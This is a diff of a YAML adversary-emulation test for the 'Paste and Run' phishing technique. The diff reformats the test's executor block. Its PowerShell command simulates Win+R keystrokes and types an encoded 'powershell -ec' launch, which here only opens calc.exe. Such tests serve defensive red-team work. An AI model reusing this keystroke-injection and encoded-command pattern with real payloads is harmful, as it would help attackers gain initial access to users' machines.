@@ -1,4 +1,4 @@
-- id: 8e967583-184d-5ec8-8d35-89c721e31712
+- requirements: []
   name: Soumaia ART Tests - Paste and run technique
   description: 'Tests the **Paste and Run** technique, where users are tricked into running
 
@@ -11,33 +11,14 @@
 
     - [From Clipboard to Compromise](https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn)'
   tactic: initial-access
-  technique:
-    attack_id: T1566.002
-    name: 'Phishing: Spearphishing Link'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          # Add user32.dll for keybd_event
-          Add-Type @"
-              using System;
-              using System.Runtime.InteropServices;
-              public class K {
-                  [DllImport("user32.dll")]
-                  public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-              }
-          "@
-
-          # Virtual key codes
-          $VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0x5B, 0x52, 0x0000, 0x0002
-
-          # Open Run dialog (Win+R)
-          [K]::keybd_event($VK_LWIN, 0, $KEYDOWN, [UIntPtr]::Zero)
-          [K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero)
-          [K]::keybd_event($VK_R, 0, $KEYUP, [UIntPtr]::Zero)
-          [K]::keybd_event($VK_LWIN, 0, $KEYUP, [UIntPtr]::Zero)
-
-          # Short delay for Run dialog
-          Start-Sleep -Milliseconds 500
-          Add-Type -AssemblyName System.Windows.Forms
-          [System.Windows.Forms.SendKeys]::SendWait("cmd /c powershell -ec " + [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('calc.exe')) + "{ENTER}")
+  technique_id: T1566.002
+  technique_name: 'Phishing: Spearphishing Link'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: Add-Type @"; using System; using System.Runtime.InteropServices; public class K { [DllImport("user32.dll")]; public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo); }; "@; $VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0x5B, 0x52, 0x0000, 0x0002; [K]::keybd_event($VK_LWIN, 0, $KEYDOWN, [UIntPtr]::Zero); [K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero); [K]::keybd_event($VK_R, 0, $KEYUP, [UIntPtr]::Zero); [K]::keybd_event($VK_LWIN, 0, $KEYUP, [UIntPtr]::Zero); Start-Sleep -Milliseconds 500; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait("cmd /c powershell -ec " + [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('calc.exe')) + "{ENTER}")
+  id: 8e967583-184d-5ec8-8d35-89c721e31712
